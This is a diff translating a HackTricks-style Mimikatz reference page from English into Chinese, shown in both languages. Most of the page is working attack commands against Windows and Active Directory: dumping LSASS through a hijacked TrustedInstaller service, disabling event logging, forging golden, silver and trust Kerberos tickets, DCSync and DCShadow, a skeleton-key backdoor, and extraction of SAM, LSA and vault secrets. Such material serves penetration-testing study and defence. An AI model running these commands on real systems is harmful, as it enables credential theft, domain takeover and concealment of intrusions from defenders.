@@ -4,220 +4,209 @@
 
 <figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
 
-Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
+通过8kSec Academy深化您在**移动安全**方面的专业知识。通过我们的自学课程掌握iOS和Android安全并获得认证：
 
 {% embed url="https://academy.8ksec.io/" %}
 
-**This page is based on one from [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Check the original for further info!
+**本页面基于[adsecurity.org](https://adsecurity.org/?page_id=1821)上的内容**。查看原文以获取更多信息！
 
-## LM and Clear-Text in memory
+## 内存中的LM和明文
 
-From Windows 8.1 and Windows Server 2012 R2 onwards, significant measures have been implemented to safeguard against credential theft:
+从Windows 8.1和Windows Server 2012 R2开始，实施了重要措施以防止凭据盗窃：
 
-- **LM hashes and plain-text passwords** are no longer stored in memory to enhance security. A specific registry setting, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ must be configured with a DWORD value of `0` to disable Digest Authentication, ensuring "clear-text" passwords are not cached in LSASS.
+- **LM哈希和明文密码**不再存储在内存中以增强安全性。必须将特定注册表设置_HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_配置为DWORD值`0`以禁用摘要身份验证，确保“明文”密码不在LSASS中缓存。
 
-- **LSA Protection** is introduced to shield the Local Security Authority (LSA) process from unauthorized memory reading and code injection. This is achieved by marking the LSASS as a protected process. Activation of LSA Protection involves:
-  1. Modifying the registry at _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ by setting `RunAsPPL` to `dword:00000001`.
-  2. Implementing a Group Policy Object (GPO) that enforces this registry change across managed devices.
+- **LSA保护**被引入以保护本地安全机构（LSA）进程免受未经授权的内存读取和代码注入。这是通过将LSASS标记为受保护进程来实现的。激活LSA保护涉及：
+1. 在_HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_中修改注册表，将`RunAsPPL`设置为`dword:00000001`。
+2. 实施一个强制此注册表更改的组策略对象（GPO），以便在受管理设备上生效。
 
-Despite these protections, tools like Mimikatz can circumvent LSA Protection using specific drivers, although such actions are likely to be recorded in event logs.
+尽管有这些保护措施，像Mimikatz这样的工具仍然可以使用特定驱动程序绕过LSA保护，尽管此类行为可能会被记录在事件日志中。
 
-### Counteracting SeDebugPrivilege Removal
+### 反制SeDebugPrivilege移除
 
-Administrators typically have SeDebugPrivilege, enabling them to debug programs. This privilege can be restricted to prevent unauthorized memory dumps, a common technique used by attackers to extract credentials from memory. However, even with this privilege removed, the TrustedInstaller account can still perform memory dumps using a customized service configuration:
-
+管理员通常拥有SeDebugPrivilege，使他们能够调试程序。可以限制此权限以防止未经授权的内存转储，这是攻击者提取内存中凭据的常用技术。然而，即使移除了此权限，TrustedInstaller帐户仍然可以使用自定义服务配置执行内存转储：
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
 ```
-
-This allows the dumping of the `lsass.exe` memory to a file, which can then be analyzed on another system to extract credentials:
-
+这允许将 `lsass.exe` 的内存转储到文件中，然后可以在另一个系统上进行分析以提取凭据：
 ```
 # privilege::debug
 # sekurlsa::minidump lsass.dmp
 # sekurlsa::logonpasswords
 ```
+## Mimikatz 选项
 
-## Mimikatz Options
+在 Mimikatz 中，事件日志篡改涉及两个主要操作：清除事件日志和修补事件服务以防止记录新事件。以下是执行这些操作的命令：
 
-Event log tampering in Mimikatz involves two primary actions: clearing event logs and patching the Event service to prevent logging of new events. Below are the commands for performing these actions:
+#### 清除事件日志
 
-#### Clearing Event Logs
+- **命令**：此操作旨在删除事件日志，使追踪恶意活动变得更加困难。
+- Mimikatz 在其标准文档中没有提供直接通过命令行清除事件日志的命令。然而，事件日志操作通常涉及使用系统工具或脚本在 Mimikatz 之外清除特定日志（例如，使用 PowerShell 或 Windows 事件查看器）。
 
-- **Command**: This action is aimed at deleting the event logs, making it harder to track malicious activities.
-- Mimikatz does not provide a direct command in its standard documentation for clearing event logs directly via its command line. However, event log manipulation typically involves using system tools or scripts outside of Mimikatz to clear specific logs (e.g., using PowerShell or Windows Event Viewer).
+#### 实验性功能：修补事件服务
 
-#### Experimental Feature: Patching the Event Service
+- **命令**：`event::drop`
+- 此实验性命令旨在修改事件日志服务的行为，有效防止其记录新事件。
+- 示例：`mimikatz "privilege::debug" "event::drop" exit`
 
-- **Command**: `event::drop`
-- This experimental command is designed to modify the Event Logging Service's behavior, effectively preventing it from recording new events.
-- Example: `mimikatz "privilege::debug" "event::drop" exit`
+- `privilege::debug` 命令确保 Mimikatz 以必要的权限操作，以修改系统服务。
+- 然后，`event::drop` 命令修补事件日志服务。
 
-- The `privilege::debug` command ensures that Mimikatz operates with the necessary privileges to modify system services.
-- The `event::drop` command then patches the Event Logging service.
+### Kerberos 票证攻击
 
-### Kerberos Ticket Attacks
+### 黄金票证创建
 
-### Golden Ticket Creation
+黄金票证允许进行域范围的访问冒充。关键命令和参数：
 
-A Golden Ticket allows for domain-wide access impersonation. Key command and parameters:
+- 命令：`kerberos::golden`
+- 参数：
+- `/domain`：域名。
+- `/sid`：域的安全标识符（SID）。
+- `/user`：要冒充的用户名。
+- `/krbtgt`：域的 KDC 服务账户的 NTLM 哈希。
+- `/ptt`：直接将票证注入内存。
+- `/ticket`：保存票证以供后用。
 
-- Command: `kerberos::golden`
-- Parameters:
-  - `/domain`: The domain name.
-  - `/sid`: The domain's Security Identifier (SID).
-  - `/user`: The username to impersonate.
-  - `/krbtgt`: The NTLM hash of the domain's KDC service account.
-  - `/ptt`: Directly injects the ticket into memory.
-  - `/ticket`: Saves the ticket for later use.
-
-Example:
-
+示例：
 ```bash
 mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
 ```
+### Silver Ticket 创建
 
-### Silver Ticket Creation
+Silver Tickets 授予对特定服务的访问权限。关键命令和参数：
 
-Silver Tickets grant access to specific services. Key command and parameters:
+- 命令：类似于 Golden Ticket，但针对特定服务。
+- 参数：
+- `/service`：要针对的服务（例如，cifs，http）。
+- 其他参数类似于 Golden Ticket。
 
-- Command: Similar to Golden Ticket but targets specific services.
-- Parameters:
-  - `/service`: The service to target (e.g., cifs, http).
-  - Other parameters similar to Golden Ticket.
-
-Example:
-
+示例：
 ```bash
 mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
 ```
+### 信任票据创建
 
-### Trust Ticket Creation
+信任票据用于通过利用信任关系访问跨域资源。关键命令和参数：
 
-Trust Tickets are used for accessing resources across domains by leveraging trust relationships. Key command and parameters:
+- 命令：类似于黄金票据，但用于信任关系。
+- 参数：
+- `/target`：目标域的 FQDN。
+- `/rc4`：信任账户的 NTLM 哈希。
 
-- Command: Similar to Golden Ticket but for trust relationships.
-- Parameters:
-  - `/target`: The target domain's FQDN.
-  - `/rc4`: The NTLM hash for the trust account.
-
-Example:
-
+示例：
 ```bash
 mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
 ```
+### 额外的 Kerberos 命令
 
-### Additional Kerberos Commands
+- **列出票证**：
 
-- **Listing Tickets**:
+- 命令：`kerberos::list`
+- 列出当前用户会话的所有 Kerberos 票证。
 
-  - Command: `kerberos::list`
-  - Lists all Kerberos tickets for the current user session.
+- **传递缓存**：
 
-- **Pass the Cache**:
+- 命令：`kerberos::ptc`
+- 从缓存文件中注入 Kerberos 票证。
+- 示例：`mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
 
-  - Command: `kerberos::ptc`
-  - Injects Kerberos tickets from cache files.
-  - Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
+- **传递票证**：
 
-- **Pass the Ticket**:
+- 命令：`kerberos::ptt`
+- 允许在另一个会话中使用 Kerberos 票证。
+- 示例：`mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
 
-  - Command: `kerberos::ptt`
-  - Allows using a Kerberos ticket in another session.
-  - Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
+- **清除票证**：
+- 命令：`kerberos::purge`
+- 清除会话中的所有 Kerberos 票证。
+- 在使用票证操作命令之前很有用，以避免冲突。
 
-- **Purge Tickets**:
-  - Command: `kerberos::purge`
-  - Clears all Kerberos tickets from the session.
-  - Useful before using ticket manipulation commands to avoid conflicts.
+### Active Directory 篡改
 
-### Active Directory Tampering
+- **DCShadow**：临时使机器充当 DC 以进行 AD 对象操作。
 
-- **DCShadow**: Temporarily make a machine act as a DC for AD object manipulation.
+- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
 
-  - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
+- **DCSync**：模拟 DC 请求密码数据。
+- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
 
-- **DCSync**: Mimic a DC to request password data.
-  - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
+### 凭证访问
 
-### Credential Access
+- **LSADUMP::LSA**：从 LSA 中提取凭证。
 
-- **LSADUMP::LSA**: Extract credentials from LSA.
+- `mimikatz "lsadump::lsa /inject" exit`
 
-  - `mimikatz "lsadump::lsa /inject" exit`
+- **LSADUMP::NetSync**：使用计算机帐户的密码数据模拟 DC。
 
-- **LSADUMP::NetSync**: Impersonate a DC using a computer account's password data.
+- _原始上下文中未提供 NetSync 的具体命令。_
 
-  - _No specific command provided for NetSync in original context._
+- **LSADUMP::SAM**：访问本地 SAM 数据库。
 
-- **LSADUMP::SAM**: Access local SAM database.
+- `mimikatz "lsadump::sam" exit`
 
-  - `mimikatz "lsadump::sam" exit`
+- **LSADUMP::Secrets**：解密存储在注册表中的秘密。
 
-- **LSADUMP::Secrets**: Decrypt secrets stored in the registry.
+- `mimikatz "lsadump::secrets" exit`
 
-  - `mimikatz "lsadump::secrets" exit`
+- **LSADUMP::SetNTLM**：为用户设置新的 NTLM 哈希。
 
-- **LSADUMP::SetNTLM**: Set a new NTLM hash for a user.
+- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
 
-  - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
+- **LSADUMP::Trust**：检索信任认证信息。
+- `mimikatz "lsadump::trust" exit`
 
-- **LSADUMP::Trust**: Retrieve trust authentication information.
-  - `mimikatz "lsadump::trust" exit`
+### 杂项
 
-### Miscellaneous
+- **MISC::Skeleton**：在 DC 的 LSASS 中注入后门。
+- `mimikatz "privilege::debug" "misc::skeleton" exit`
 
-- **MISC::Skeleton**: Inject a backdoor into LSASS on a DC.
-  - `mimikatz "privilege::debug" "misc::skeleton" exit`
+### 权限提升
 
-### Privilege Escalation
+- **PRIVILEGE::Backup**：获取备份权限。
 
-- **PRIVILEGE::Backup**: Acquire backup rights.
+- `mimikatz "privilege::backup" exit`
 
-  - `mimikatz "privilege::backup" exit`
+- **PRIVILEGE::Debug**：获取调试权限。
+- `mimikatz "privilege::debug" exit`
 
-- **PRIVILEGE::Debug**: Obtain debug privileges.
-  - `mimikatz "privilege::debug" exit`
+### 凭证转储
 
-### Credential Dumping
+- **SEKURLSA::LogonPasswords**：显示已登录用户的凭证。
 
-- **SEKURLSA::LogonPasswords**: Show credentials for logged-on users.
+- `mimikatz "sekurlsa::logonpasswords" exit`
 
-  - `mimikatz "sekurlsa::logonpasswords" exit`
+- **SEKURLSA::Tickets**：从内存中提取 Kerberos 票证。
+- `mimikatz "sekurlsa::tickets /export" exit`
 
-- **SEKURLSA::Tickets**: Extract Kerberos tickets from memory.
-  - `mimikatz "sekurlsa::tickets /export" exit`
+### Sid 和 Token 操作
 
-### Sid and Token Manipulation
+- **SID::add/modify**：更改 SID 和 SIDHistory。
 
-- **SID::add/modify**: Change SID and SIDHistory.
+- 添加：`mimikatz "sid::add /user:targetUser /sid:newSid" exit`
+- 修改：_原始上下文中未提供修改的具体命令。_
 
-  - Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
-  - Modify: _No specific command for modify in original context._
+- **TOKEN::Elevate**：模拟令牌。
+- `mimikatz "token::elevate /domainadmin" exit`
 
-- **TOKEN::Elevate**: Impersonate tokens.
-  - `mimikatz "token::elevate /domainadmin" exit`
+### 终端服务
 
-### Terminal Services
+- **TS::MultiRDP**：允许多个 RDP 会话。
 
-- **TS::MultiRDP**: Allow multiple RDP sessions.
+- `mimikatz "ts::multirdp" exit`
 
-  - `mimikatz "ts::multirdp" exit`
-
-- **TS::Sessions**: List TS/RDP sessions.
-  - _No specific command provided for TS::Sessions in original context._
+- **TS::Sessions**：列出 TS/RDP 会话。
+- _原始上下文中未提供 TS::Sessions 的具体命令。_
 
 ### Vault
 
-- Extract passwords from Windows Vault.
-  - `mimikatz "vault::cred /patch" exit`
+- 从 Windows Vault 中提取密码。
+- `mimikatz "vault::cred /patch" exit`
 
 <figure><img src="/images/image (2).png" alt=""><figcaption></figcaption></figure>
 
-Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
+深入了解 **移动安全**，请访问 8kSec 学院。通过我们的自学课程掌握 iOS 和 Android 安全并获得认证：
 
 {% embed url="https://academy.8ksec.io/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
-
